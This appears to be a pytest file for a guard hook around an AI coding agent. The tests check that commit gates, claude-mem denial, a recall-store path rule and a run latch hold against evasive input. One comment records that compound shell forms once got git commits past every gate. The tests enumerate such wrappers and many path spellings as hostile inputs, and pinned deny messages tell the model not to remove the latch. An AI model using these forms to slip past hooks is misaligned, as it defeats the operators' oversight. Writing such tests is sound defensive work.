def _execute_text() -> str:
    return _EXECUTE_MD.read_text(encoding="utf-8")


def _md_step2(text: str | None = None) -> str:
    text = text if text is not None else _execute_text()
    start = text.index("\n2. ")
    return text[start:text.index("\n3. ", start)]


def _md_step5(text: str | None = None) -> str:
    text = text if text is not None else _execute_text()
    start = text.index("\n5. ")
    return text[start:text.index("\n\n", start)]


def test_execute_md_marker_step_copies_baseline_never_recomputes() -> None:
    block = _md_step2()
    assert "write the tests-ran marker" in block, "step-2 slice must be the marker write"
    assert _BASELINE_LINE_RE.search(block), (
        "step 2 must mandate a `baseline=<sha>` line copied from the story's "
        "recorded baseline, never re-derived from `git rev-parse HEAD`"
    )
    # the pre-existing step-2 semantics must survive the edit
    assert "PRINT the raw output" in block
    assert "{workflow.implementation_artifacts}/.tests-ran-<story_id>" in block
    # and the multi-commit reason for copying is stated, not just the rule
    assert re.search(r"more than once|second commit", block)


def test_execute_md_step5_fresh_marker_also_embeds_baseline() -> None:
    block = _md_step5()
    assert "re-commit" in block, "step-5 slice must be the re-verify/re-commit block"
    assert "fresh `.tests-ran-<story_id>` marker" in block
    assert _BASELINE_LINE_RE.search(block), (
        "step 5's fresh marker must carry the same copied-not-recomputed "
        "`baseline=<sha>` line as step 2's"
    )


def test_mutant_step5_marker_without_baseline_reds_only_step5() -> None:
    """Twin: strip the baseline rule from step 5 only.

    The step-5 matcher must red while the IDENTICAL matcher stays green on step
    2. The green control is the load-bearing half: a matcher that scanned the
    whole file would be satisfied by step 2's sentence and would pass the step-5
    check vacuously.
    """
    text = _execute_text()
    original = _md_step5(text)
    mutated_block = _STEP5_BASELINE_SENTENCE_RE.sub("", original, count=1)
    assert mutated_block != original, "step-5 baseline sentence anchor drifted"
    mutated = text.replace(original, mutated_block, 1)

    assert not _BASELINE_LINE_RE.search(_md_step5(mutated)), (
        "with the sentence stripped, the step-5 assertion must fail"
    )
    assert _BASELINE_LINE_RE.search(_md_step2(mutated)), (
        "the step-2 control must stay green under the same mutation"
    )


def test_mutant_step2_marker_without_baseline_reds_only_step2() -> None:
    """Twin, mirrored: strip the baseline rule from step 2 only.

    Same paired shape, so neither site can satisfy its own check off the other's
    copy of the rule.
    """
    text = _execute_text()
    original = _md_step2(text)
    mutated_block = _STEP2_BASELINE_SENTENCE_RE.sub("", original, count=1)
    assert mutated_block != original, "step-2 baseline sentence anchor drifted"
    mutated = text.replace(original, mutated_block, 1)

    assert not _BASELINE_LINE_RE.search(_md_step2(mutated)), (
        "with the sentence stripped, the step-2 assertion must fail"
    )
    assert _BASELINE_LINE_RE.search(_md_step5(mutated)), (
        "the step-5 control must stay green under the same mutation"
    )


# ---------------------------------------------------------------------------
# Compound commands and the `&` separator.
#
# `_token_write_verbs` reads the segment's LEADING token. A shell keyword or a
# group opener occupies that position inside every compound form, and a lone
# `&` was in neither separator set -- so `if true; then <verb>; fi` and
# `build & <verb>` both classified as "no git write" and skipped the
# protected-branch, tests-ran, freshness AND empty-index gates at once.
# ---------------------------------------------------------------------------

_V = "git" + " " + "commit"

_COMPOUND_COMMIT_FORMS = (
    ("if_then", "if true; then %s -m wip; fi" % _V),
    ("for_do", "for i in 1; do %s -m wip; done" % _V),
    ("while_do", "while false; do %s -m wip; done" % _V),
    ("subshell", "( %s -m wip )" % _V),
    ("subshell_glued", "(%s -m wip)" % _V),
    ("brace_group", "{ %s -m wip; }" % _V),
    ("negated", "! %s -m wip" % _V),
    ("background_amp", "npm run build & %s -m wip" % _V),
)


@pytest.mark.parametrize(
    "name,command",
    _COMPOUND_COMMIT_FORMS,
    ids=[n for n, _ in _COMPOUND_COMMIT_FORMS],
)
def test_compound_forms_still_reach_the_commit_gate(
    tmp_path: Path, name: str, command: str
) -> None:
    """Every compound wrapping of a real commit is still classified as a write."""
    repo = tmp_path / ("repo_" + name)
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_hook(_commit_event(repo, command), repo)

    assert code == 2, "%s: compound form was waved through" % name
    assert "Protected-branch" in _reason(out)


_BENIGN_COMPOUND_FORMS = (
    ("if_then", "if true; then echo hi; fi"),
    ("for_do", "for i in 1 2; do echo $i; done"),
    ("subshell", "( echo hi )"),
    ("brace_group", "{ echo hi; }"),
    ("background_amp", "npm run watch & echo started"),
)


@pytest.mark.parametrize(
    "name,command",
    _BENIGN_COMPOUND_FORMS,
    ids=[n for n, _ in _BENIGN_COMPOUND_FORMS],
)
def test_compound_forms_without_a_git_write_stay_allowed(
    tmp_path: Path, name: str, command: str
) -> None:
    """Control. Stripping keywords must not turn every compound into a deny --
    without this pair, the deny test above would also pass on a guard that
    denied everything."""
    repo = tmp_path / ("ctl_" + name)
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_hook(_commit_event(repo, command), repo)

    assert code == 0, "%s: benign compound was denied" % name
    assert out is None


def test_quoted_ampersand_in_a_git_value_option_still_denies(tmp_path: Path) -> None:
    """The regression an `&` bolted onto the EXISTING separator sets would cause.

    Splitting on `&` is quote-blind, so `git -c alias.x='a&b' <verb>` tears into
    two fragments that BOTH fail to tokenize and BOTH miss the fallback regex
    (the first carries no verb, the second carries no `git`). Adding `&` as a
    THIRD unioned set keeps the un-split classification that already caught it.
    """
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    command = "git -c alias.x='a&b' " + _V.split()[1] + " -m wip"
    code, out = _run_hook(_commit_event(repo, command), repo)

    assert code == 2
    assert "Protected-branch" in _reason(out)


_KEYWORD_STRIP_LINE = "        elif head.lower() in _SHELL_KEYWORDS:"
_AMP_SEPARATOR_LINE = '        r"&&|\\|\\||;|\\||&|\\n|\\r",\n'


def test_mutant_without_keyword_stripping_allows_a_compound_write(
    tmp_path: Path,
) -> None:
    """Twin: drop the keyword strip and the compound form is ALLOWED.

    The ALLOW is the point. If the deny survived this mutation, the strip would
    not be what produces it and the tests above would pin nothing.
    """
    mutant = _write_mutant(
        tmp_path,
        "no_keyword_strip",
        _KEYWORD_STRIP_LINE,
        "        elif False:",
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo, "if true; then %s -m wip; fi" % _V), repo
    )

    assert code == 0
    assert out is None


def test_mutant_without_the_amp_separator_allows_a_background_write(
    tmp_path: Path,
) -> None:
    """Twin for the `&` set: drop it, and the quote-aware reading that also
    splits at `&`, and `build & <verb>` is ALLOWED again."""
    mutant = _write_mutant_multi(
        tmp_path, "no_amp_separator", [(_AMP_SEPARATOR_LINE, ""), (_QUOTED_READING, "")]
    )
    repo = tmp_path / "repo"
    repo.mkdir()
    _init_repo(repo, "main")

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo, "npm run build & %s -m wip" % _V), repo
    )

    assert code == 0
    assert out is None


# ---------------------------------------------------------------------------
# Cross-Session Recall on the local run store (latch v2).
#
# latch-and-guard.md, Guard items 1 to 5, through the CSR-UNIT and CSR-INT rows
# of test-design-epic-cross-session-recall-local-store.md marked PR 2 (each
# test names its row), and Guard item 7, the latch-path rule of decision 11
# (AC-29, AC-30, AC-33), in its own section near the end. Every case runs the
# real hook as a subprocess under a
# present latch whose `store` sits under tmp_path, with HOME and USERPROFILE
# pointed at tmp and ULTRACODE_IMPL_ARTIFACTS at the latch's folder; only the
# parity and separator rows read the hook in-process. On Windows every Bash
# string is built with as_posix() or quoting: POSIX shlex drops unquoted
# backslashes.
#
# Maintainer defaults pinned here, recorded as such:
#   - C-2: a latch with no usable store (unset, a v1 latch, an unreadable
#     latch) still denies every claude-mem call and skips the store-path rule;
#     the latch-path rule still applies to it.
#   - Liveness (decisions 2 and 11): a present latch counts as live, and every
#     deny it causes names the latch path and ends with a note for the person:
#     delete a left-behind latch by hand, and the model must not remove it.
# Choices this change makes on the test design's open points, to confirm:
#   - C-7: `python`, `python3` and `python3.N` may lead an exempt segment, `py`
#     may not. C-8: the script must follow `uv run` or python directly.
#   - C-11: the skill root is the guard's own location (scripts/hooks/../..).
# ---------------------------------------------------------------------------

SCRIPTS = HOOK.parents[1]
_PINNED_RECALL = SCRIPTS / "mem_recall.py"
_PINNED_OBSERVATION = SCRIPTS / "mem_observation.py"
_MEM_COMMON = SCRIPTS / "lib" / "mem_common.py"
_REPO_ROOT = HOOK.parents[4]
_RUN = "epic-7-20260604T172512Z"
_DEAD_RUN = "epic-3-20260101T000000Z"
_WINDOWS_ONLY = pytest.mark.skipif(sys.platform != "win32", reason="Windows path folding")
_NEEDS_GIT = pytest.mark.skipif(not shutil.which("git"), reason="git not on PATH")


def _v2_latch(store: object, **overrides) -> dict:
    """A v2 latch as mem_recall.py latch writes it (green unless overridden)."""
    state = {
        "latch_version": 2,
        "run_id": _RUN,
        "backend": "jsonl",
        "store_ok": True,
        "recall": "on",
        "store": None if store is None else str(store),
        "fingerprint": "0123456789abcdef",
        "created_at": "2026-06-04T17:25:12Z",
    }
    state.update(overrides)
    return state


class _StoreWorld(NamedTuple):
    home: Path
    store: Path
    cwd: Path
    impl: Path
    tmp: Path

    @property
    def latch(self) -> Path:
        return self.impl / ".mem-state.json"

    @property
    def s(self) -> str:
        """The store as a Bash command spells it."""
        return self.store.as_posix()

    @property
    def env(self) -> dict:
        return {
            "HOME": str(self.home),
            "USERPROFILE": str(self.home),
            "ULTRACODE_IMPL_ARTIFACTS": str(self.impl),
        }


@pytest.fixture
def store_world(tmp_path: Path) -> _StoreWorld:
    """A green v2 latch whose store is ~/.ultracode-goal/recall under a tmp home."""
    home = tmp_path / "home"
    store = home / ".ultracode-goal" / "recall"
    cwd = tmp_path / "repo"
    impl = tmp_path / "impl"
    store.mkdir(parents=True)
    cwd.mkdir()
    _write_state(impl, _v2_latch(store))
    return _StoreWorld(home, store, cwd, impl, tmp_path)


def _run_in(
    world: _StoreWorld,
    tool_name: str,
    tool_input: dict,
    *,
    cwd: Path | None = None,
    hook: Path = HOOK,
) -> tuple[int, dict | None]:
    where = cwd or world.cwd
    return _run_mutant_hook(hook, _mem_event(tool_name, where, tool_input), where, world.env)


def _bash(world: _StoreWorld, command: str, **kwargs) -> tuple[int, dict | None]:
    return _run_in(world, "Bash", {"command": command}, **kwargs)


def _person_note(latch: Path) -> str:
    """The tail every latch deny ends with (AC-13, AC-33): addressed to the
    person, naming the latch, and telling the model not to remove it."""
    return (
        "For the user: if no UltraCode-Goal run is active, a run ended without "
        f"removing this latch. Delete {latch} by hand. The model must not try "
        "to remove it itself."
    )


def _assert_latch_denied(code: int, out: dict | None, latch: Path) -> str:
    """A deny the latch causes: it names the latch and ends with the note for
    the person (AC-13, AC-33)."""
    assert code == 2, out
    assert out is not None
    decision = out["hookSpecificOutput"]
    assert decision["permissionDecision"] == "deny"
    reason = decision["permissionDecisionReason"]
    assert reason.startswith("Cross-Session Recall guard: ")
    assert f"The run latch {latch} is present" in reason
    assert reason.endswith(_person_note(latch))
    return reason


def _assert_allowed(code: int, out: dict | None) -> None:
    assert code == 0, out
    assert out is None, out


def _filter_args(world: _StoreWorld) -> str:
    return f"filter --impl-artifacts {world.impl.as_posix()} --store {world.s}"


def _write_args(world: _StoreWorld) -> str:
    return (
        f"write --impl-artifacts {world.impl.as_posix()} --store {world.s} "
        f"--epic 7 --run-id {_RUN} --gate-status PASS --verdict advance"
    )


def _exempt_filter(world: _StoreWorld) -> str:
    return f"uv run {_PINNED_RECALL.as_posix()} {_filter_args(world)}"


# --- Guard item 1: claude-mem, denied under every present latch --------------

_PRESENT_LATCHES = {
    "v1-green-by-old-rules": lambda store: _GREEN_STATE,
    "v1-red": lambda store: {**_GREEN_STATE, "schema_ok": False},
    "v2-store-ok": lambda store: _v2_latch(store),
    "v2-store-not-ok": lambda store: _v2_latch(store, store_ok=False),
    "v2-recall-off": lambda store: _v2_latch(store, recall="off", store_ok=False),
    "zero-byte": lambda store: "",
    "malformed-json": lambda store: "{not: valid json,,,",
    "non-object": lambda store: [1, 2],
    "latch-version-3": lambda store: _v2_latch(store, latch_version=3),
}


@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
@pytest.mark.parametrize("latch", sorted(_PRESENT_LATCHES))
def test_csr_claude_mem_call_denied_under_every_present_latch(
    store_world: _StoreWorld, latch: str, tool_name: str
) -> None:
    """CSR-UNIT-004 (AC-11, AC-13): every name form, every present latch, no green path."""
    _write_state(store_world.impl, _PRESENT_LATCHES[latch](store_world.store))

    code, out = _run_in(store_world, tool_name, {"query": "x"})

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing the claude-mem MCP call {tool_name}." in reason


_INPUT_KEYS = (
    ("Read", "file_path"),
    ("Write", "file_path"),
    ("Edit", "file_path"),
    ("MultiEdit", "file_path"),
    ("NotebookEdit", "notebook_path"),
    ("Glob", "path"),
    ("Glob", "pattern"),
    ("Grep", "path"),
    ("Grep", "glob"),
)
_INPUT_KEY_IDS = [f"{tool}-{key}" for tool, key in _INPUT_KEYS]


def _file_input(tool: str, key: str, value: str) -> dict:
    """A realistic input for one file tool, with `value` under `key`."""
    base = {
        "Read": {},
        "Write": {"content": "x"},
        "Edit": {"old_string": "a", "new_string": "b"},
        "MultiEdit": {"edits": [{"old_string": "a", "new_string": "b"}]},
        "NotebookEdit": {"new_source": "x"},
        "Glob": {"pattern": "*.json"},
        "Grep": {"pattern": "secret"},
    }[tool]
    return {**base, key: value}


@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
def test_csr_claude_mem_reach_denied_through_every_input_key(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-005 (AC-11): a reach into .claude-mem under a green v2 latch."""
    value = (store_world.home / ".claude-mem" / "claude-mem.db").as_posix()

    code, out = _run_in(store_world, tool, _file_input(tool, key, value))

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing a {tool} call whose {key} reaches into '.claude-mem'" in reason


def test_csr_claude_mem_reach_denied_through_bash(store_world: _StoreWorld) -> None:
    """CSR-UNIT-005 (AC-11): the Bash half."""
    code, out = _bash(store_world, "sqlite3 ~/.claude-mem/claude-mem.db .tables")
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize("tool_name", _MEM_PLUGIN_TOOLS + _MEM_BARE_TOOLS)
def test_csr_no_latch_leaves_claude_mem_alone(tmp_path: Path, tool_name: str) -> None:
    """CSR-UNIT-006 (AC-11): outside a run the user's own claude-mem is untouched.

    The matcher and look-alike rows the spec keeps are unchanged above:
    test_risk_matcher_hits_live_claude_mem_names and
    test_risk_matcher_ignores_lookalike_names.
    """
    impl = tmp_path / "impl"  # no latch written
    code, out = _run_hook(
        _mem_event(tool_name, tmp_path, {"query": "x"}),
        tmp_path,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    _assert_allowed(code, out)


@pytest.mark.parametrize("tool_name", _NON_MEM_TOOLS)
def test_csr_lookalike_names_pass_a_v2_latch(store_world: _StoreWorld, tool_name: str) -> None:
    """CSR-UNIT-006: the look-alikes stay allowed under a v2 latch with a store too."""
    code, out = _run_in(store_world, tool_name, {"query": "x"})
    _assert_allowed(code, out)


def test_csr_deny_reason_names_the_latch_and_the_delete_advice(store_world: _StoreWorld) -> None:
    """AC-13 and AC-33 wording, pinned whole on one deny (decisions 2 and 11):
    the stale-latch tail speaks to the person, and tells the model not to try."""
    code, out = _run_in(store_world, "mcp__claude-mem__search", {})

    assert code == 2
    latch = store_world.latch
    assert _reason(out) == (
        "Cross-Session Recall guard: refusing the claude-mem MCP call "
        "mcp__claude-mem__search. UltraCode-Goal no longer uses claude-mem, so "
        "while a run latch is present every claude-mem call is denied. The run "
        f"latch {latch} is present, and a present latch counts as a live "
        "UltraCode-Goal run, whatever its version or colour. For the user: if "
        "no UltraCode-Goal run is active, a run ended without removing this "
        f"latch. Delete {latch} by hand. The model must not try to remove it "
        "itself."
    )


def test_csr_left_behind_latch_keeps_denying_until_deleted(store_world: _StoreWorld) -> None:
    """CSR-UNIT-027 (AC-13): another run's latch, left by a run that died.

    The guard reads no clock and no run id, so the latch denies claude-mem, the
    store path and the model's own attempt to remove it, each reason naming the
    latch and the note for the person, until the person deletes the file by
    hand; then the same calls are allowed (AC-33).
    """
    _write_state(
        store_world.impl,
        _v2_latch(store_world.store, run_id=_DEAD_RUN, created_at="2026-01-01T00:00:00Z"),
    )
    run_file = f"{store_world.s}/local-0123456789abcdef/runs/{_DEAD_RUN}.jsonl"
    calls = (
        ("mcp__plugin_claude-mem_mcp-search__search", {"query": "x"}),
        ("Read", {"file_path": run_file}),
        ("Bash", {"command": f"cat {run_file}"}),
        ("Bash", {"command": f"rm -f {store_world.latch.as_posix()}"}),
    )
    for tool, tool_input in calls:
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)

    store_world.latch.unlink()  # the person, by hand

    for tool, tool_input in calls:
        code, out = _run_in(store_world, tool, tool_input)
        _assert_allowed(code, out)


def test_csr_latch_the_hook_cannot_look_at_counts_as_present(store_world: _StoreWorld) -> None:
    """Fail closed: in an implementation artifacts folder the hook may not
    search, whether a latch is there cannot be told, so it counts as present.
    A claude-mem call and a change to the latch are still denied."""
    store_world.impl.chmod(0o600)
    try:
        try:
            os.lstat(store_world.latch)
        except PermissionError:
            pass
        else:
            pytest.skip("folder modes do not bind this user")
        reason = _assert_latch_denied(*_run_in(store_world, "mcp__claude-mem__search", {}), store_world.latch)
        assert "refusing the claude-mem MCP call mcp__claude-mem__search." in reason
        write = {"file_path": store_world.latch.as_posix(), "content": "{}"}
        reason = _assert_latch_denied(*_run_in(store_world, "Write", write), store_world.latch)
        assert "refusing a Write call whose file_path names the run latch." in reason
    finally:
        store_world.impl.chmod(0o700)


def test_csr_anything_at_the_latch_path_counts_as_present(store_world: _StoreWorld) -> None:
    """Fail closed: a latch path that holds a folder is a latch that cannot be
    read, so claude-mem is denied, and so is removing it (the latch-path rule
    reads no latch); with no store to read, nothing is denied by store path."""
    store_world.latch.unlink()
    store_world.latch.mkdir()

    code, out = _run_in(store_world, "mcp__claude-mem__search", {})
    _assert_latch_denied(code, out, store_world.latch)
    code, out = _bash(store_world, f"rm -r {store_world.latch.as_posix()}")
    _assert_latch_denied(code, out, store_world.latch)
    _assert_allowed(*_run_in(store_world, "Read", {"file_path": f"{store_world.s}/x"}))


# --- Guard item 2: the store-path rule ----------------------------------------


def _store_spellings(world: _StoreWorld) -> dict[str, str]:
    return {
        "absolute": world.s,
        "tilde": "~/.ultracode-goal/recall",
        "dollar-home": "$HOME/.ultracode-goal/recall",
        "braced-home": "${HOME}/.ultracode-goal/recall",
        "percent-userprofile": "%USERPROFILE%/.ultracode-goal/recall",
        "relative-to-cwd": Path(os.path.relpath(world.store, world.cwd)).as_posix(),
    }


_SPELLINGS = (
    "absolute",
    "tilde",
    "dollar-home",
    "braced-home",
    "percent-userprofile",
    "relative-to-cwd",
)


@pytest.mark.parametrize("channel", ["read", "bash-unquoted", "bash-double-quoted"])
@pytest.mark.parametrize("spelling", _SPELLINGS)
def test_csr_store_spelling_denied(store_world: _StoreWorld, spelling: str, channel: str) -> None:
    """CSR-UNIT-007 (AC-12, AC-23): one deny per accepted spelling and channel."""
    path = f"{_store_spellings(store_world)[spelling]}/runs/x.jsonl"
    if channel == "read":
        code, out = _run_in(store_world, "Read", {"file_path": path})
    elif channel == "bash-unquoted":
        code, out = _bash(store_world, f"cat {path}")
    else:
        code, out = _bash(store_world, f'cat "{path}"')

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"names the recall store {store_world.store}." in reason
    assert str(_PINNED_RECALL) in reason and str(_PINNED_OBSERVATION) in reason


@pytest.mark.parametrize(
    "form",
    ["tool --opt={s}/runs/x.jsonl", "FOO={s} cmd", "cat <{s}/runs/x.jsonl"],
    ids=["glued-option", "glued-assignment", "glued-input-redirection"],
)
def test_csr_store_glued_into_a_word_denied(store_world: _StoreWorld, form: str) -> None:
    """CSR-UNIT-007: the glued forms a whole-token comparison would miss."""
    code, out = _bash(store_world, form.format(s=store_world.s))
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize("suffix", ["", "/", "//", "/."], ids=["bare", "slash", "two-slashes", "slash-dot"])
def test_csr_store_root_with_trailing_separators_denied(store_world: _StoreWorld, suffix: str) -> None:
    """CSR-UNIT-007: the store folder itself, with and without trailing separators."""
    root = store_world.s + suffix
    for tool, tool_input in (
        ("Glob", {"pattern": "*", "path": root}),
        ("Read", {"file_path": root}),
        ("Bash", {"command": f"ls {root}"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_latch_denied(code, out, store_world.latch)


def test_csr_store_siblings_and_ancestors_are_allowed(store_world: _StoreWorld) -> None:
    """Control: a name that merely starts like the store, or a folder above it
    (the accepted ancestor-search residual), is not the store."""
    sibling = f"{store_world.s}2/runs/x.jsonl"
    parent = store_world.store.parent.as_posix()
    for tool, tool_input in (
        ("Read", {"file_path": sibling}),
        ("Bash", {"command": f"cat {sibling}"}),
        ("Glob", {"pattern": "**/*.jsonl", "path": parent}),
        ("Bash", {"command": f"ls {parent}"}),
        ("Bash", {"command": "echo 'feat(recall): keep the store out'"}),
    ):
        code, out = _run_in(store_world, tool, tool_input)
        _assert_allowed(code, out)


@_WINDOWS_ONLY
@pytest.mark.parametrize("quoting", ["unquoted", "double-quoted"])
def test_csr_userprofile_backslash_spelling_denied_on_windows(
    store_world: _StoreWorld, quoting: str
) -> None:
    """CSR-UNIT-007, Windows only: %USERPROFILE%\\... with backslashes.

    On POSIX `\\` is not a separator, so this spelling names no store there.
    Unquoted, shlex drops the backslashes and the raw text still reads it.
    """
    path = "%USERPROFILE%\\.ultracode-goal\\recall\\runs\\x.jsonl"
    code, out = _run_in(store_world, "Read", {"file_path": path})
    _assert_latch_denied(code, out, store_world.latch)
    command = f"cat {path}" if quoting == "unquoted" else f'cat "{path}"'
    code, out = _bash(store_world, command)
    _assert_latch_denied(code, out, store_world.latch)


@_WINDOWS_ONLY
@pytest.mark.parametrize(
    "variant",
    ["forward-slashes", "upper-case", "upper-case-forward-slashes", "lower-case"],
)
def test_csr_windows_separator_and_case_folding(store_world: _StoreWorld, variant: str) -> None:
    """CSR-UNIT-008 (AC-12, AC-23), Windows only: a path that differs from the
    store only in separator or letter case is the store."""
    native = str(store_world.store)
    spelled = {
        "forward-slashes": store_world.store.as_posix(),
        "upper-case": native.upper(),
        "upper-case-forward-slashes": store_world.store.as_posix().upper(),
        "lower-case": native.lower(),
    }[variant]
    path = spelled + "\\runs\\x.jsonl"
    code, out = _run_in(store_world, "Read", {"file_path": path})
    _assert_latch_denied(code, out, store_world.latch)
    code, out = _bash(store_world, f'cat "{path}"')
    _assert_latch_denied(code, out, store_world.latch)


@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
def test_csr_store_named_in_each_input_key_denied(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-009 (AC-12, AC-23): one deny per inspected input key."""
    if key in ("pattern", "glob"):
        value = f"{store_world.s}/**/*.jsonl"
    else:
        value = f"{store_world.s}/runs/x.jsonl"

    code, out = _run_in(store_world, tool, _file_input(tool, key, value))

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"refusing a {tool} call whose {key} names the recall store" in reason


@pytest.mark.parametrize(
    "tool,key",
    [("Glob", "pattern"), ("Grep", "glob")],
    ids=["Glob-pattern", "Grep-glob"],
)
def test_csr_relative_pattern_is_taken_from_the_tool_path(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-009: a relative pattern under the tool's own `path` reaches the
    store although `path` (an ancestor) does not."""
    tool_input = _file_input(tool, key, "recall/**/*.jsonl")
    tool_input["path"] = store_world.store.parent.as_posix()

    code, out = _run_in(store_world, tool, tool_input)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert f"whose {key} names the recall store" in reason


@pytest.mark.parametrize("tool,key", _INPUT_KEYS, ids=_INPUT_KEY_IDS)
def test_csr_unrelated_paths_pass_every_file_tool(
    store_world: _StoreWorld, tool: str, key: str
) -> None:
    """CSR-UNIT-009 control: the same tool and key on a path outside the store."""
    value = (store_world.cwd / "src" / "x.py").as_posix()
    code, out = _run_in(store_world, tool, _file_input(tool, key, value))
    _assert_allowed(code, out)


@pytest.mark.parametrize(
    "joiner",
    [" ; ", "\n", " & "],
    ids=["chain", "newline", "background-amp"],
)
def test_csr_store_segment_denied_under_each_separator_set(
    store_world: _StoreWorld, joiner: str
) -> None:
    """CSR-UNIT-010 (AC-12, AC-23): an exempt lead never covers a store-touching
    tail, whichever separator set exposes it."""
    command = f"{_exempt_filter(store_world)}{joiner}cat {store_world.s}/runs/x.jsonl"

    code, out = _bash(store_world, command)

    reason = _assert_latch_denied(code, out, store_world.latch)
    assert "segment 'cat " in reason


def test_csr_each_separator_set_is_load_bearing(guard_module, tmp_path: Path, monkeypatch) -> None:
    """CSR-UNIT-010 twin: drop the sets that expose a tail and it hides behind
    the exempt lead, so each set is what denies its own case."""
    store = tmp_path / "home" / ".ultracode-goal" / "recall"
    root = (os.path.normcase(os.path.abspath(store)),)
    cwd = str(tmp_path)
    homes = [str(tmp_path / "home")]
    lead = f"uv run {_PINNED_RECALL.as_posix()} filter --store {store.as_posix()}"
    tail = f"cat {store.as_posix()}/runs/x.jsonl"
    shipped = guard_module._STORE_SEPARATOR_SETS
    for command, without_its_sets in (
        (f"{lead} ; {tail}", (r"(?!)",)),  # no split at all
        (f"{lead}\n{tail}", shipped[:1]),  # no newline set
        (f"{lead} & {tail}", shipped[:2]),  # no lone-& set
    ):
        assert guard_module._store_segment(command, root, cwd, homes) is not None, command
        monkeypatch.setattr(guard_module, "_STORE_SEPARATOR_SETS", without_its_sets)
        assert guard_module._store_segment(command, root, cwd, homes) is None, command
        monkeypatch.setattr(guard_module, "_STORE_SEPARATOR_SETS", shipped)


def _git_classifier_separator_sets() -> tuple[str, ...]:
    """The tuple of patterns the `for separators in (...)` loop of
    _command_write_verbs iterates, read from the hook's syntax tree."""
    tree = ast.parse(_hook_source())
    func = next(
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.FunctionDef) and node.name == "_command_write_verbs"
    )
    loops = [
        node
        for node in ast.walk(func)
        if isinstance(node, ast.For)
        and isinstance(node.target, ast.Name)
        and node.target.id == "separators"
    ]
    assert len(loops) == 1, "the git classifier's separator loop moved"
    assert isinstance(loops[0].iter, ast.Tuple)
    return tuple(ast.literal_eval(element) for element in loops[0].iter.elts)


def test_csr_store_separator_sets_mirror_the_git_classifier(guard_module) -> None:
    """The store rule splits under "each of the guard's three separator sets":
    exactly the patterns _command_write_verbs splits under, in order, so a set
    added to or dropped from either side reds here."""
    assert guard_module._STORE_SEPARATOR_SETS == _git_classifier_separator_sets()
    assert len(guard_module._STORE_SEPARATOR_SETS) == 3


# --- Guard item 3: the pinned script exemption ------------------------------


def _allowed_calls(world: _StoreWorld) -> dict[str, str]:
    recall = _PINNED_RECALL.as_posix()
    observation = _PINNED_OBSERVATION.as_posix()
    impl = world.impl.as_posix()
    filt = _filter_args(world)
    return {
        "uv-run-write": f"uv run {observation} {_write_args(world)}",
        "uv-run-filter": f"uv run {recall} {filt}",
        "uv-run-latch": (
            f"uv run {recall} latch --impl-artifacts {impl} --run-id {_RUN} "
            f"--recall on --store {world.s}"
        ),
        "uv-run-drain": f"uv run {observation} drain --impl-artifacts {impl} --store {world.s}",
        "python-write": f"python {observation} {_write_args(world)}",
        "python3-filter": f"python3 {recall} {filt}",
        "python3-minor-filter": f"python3.11 {recall} {filt}",
        "leading-assignment": f"FOO=1 uv run {recall} {filt}",
        "keyword": f"if true; then uv run {recall} {filt}; fi",
        "paren-group": f"( uv run {recall} {filt} )",
        "glued-paren": f"(uv run {recall} {filt})",
        "brace-group": f"{{ uv run {recall} {filt}; }}",
        "dot-step": f"uv run {SCRIPTS.as_posix()}/./mem_recall.py {filt}",
        "tilde-store": f"uv run {recall} filter --impl-artifacts {impl} --store ~/.ultracode-goal/recall",
        "quoted": f'uv run "{recall}" filter --impl-artifacts "{impl}" --store "{world.s}"',
        "then-unrelated": f"uv run {recall} {filt} && echo done",
    }


_ALLOWED_CALLS = (
    "uv-run-write",
    "uv-run-filter",
    "uv-run-latch",
    "uv-run-drain",
    "python-write",
    "python3-filter",
    "python3-minor-filter",
    "leading-assignment",
    "keyword",
    "paren-group",
    "glued-paren",
    "brace-group",
    "dot-step",
    "tilde-store",
    "quoted",
    "then-unrelated",
)


@pytest.mark.parametrize("name", _ALLOWED_CALLS)
def test_csr_pinned_recall_scripts_are_exempt(store_world: _StoreWorld, name: str) -> None:
    """CSR-UNIT-011 (AC-12): the positive controls. An exemption that fails
    closed turns recall off in every run."""
    code, out = _bash(store_world, _allowed_calls(store_world)[name])
    _assert_allowed(code, out)


@pytest.mark.parametrize(
    "cwd_name,operand",
    [("scripts", "./mem_recall.py"), ("skill-root", "scripts/mem_recall.py")],
    ids=["dot-slash-from-scripts", "relative-from-skill-root"],
)
def test_csr_relative_pinned_path_is_exempt_from_its_own_folder(
    store_world: _StoreWorld, cwd_name: str, operand: str
) -> None:
    """CSR-UNIT-011: a relative path counts when it resolves, from the event's
    cwd, to the pinned script."""
    cwd = SCRIPTS if cwd_name == "scripts" else SCRIPTS.parent
    code, out = _bash(store_world, f"uv run {operand} {_filter_args(store_world)}", cwd=cwd)
    _assert_allowed(code, out)


@pytest.mark.parametrize("joiner", ["&&", "||", ";", "|", "\n", "&"])
def test_csr_compound_with_a_store_segment_denied(store_world: _StoreWorld, joiner: str) -> None:
    """CSR-UNIT-012 (AC-12, AC-23): checked per segment, not on the whole command."""
    command = f"{_exempt_filter(store_world)} {joiner} cat {store_world.s}/runs/x.jsonl"
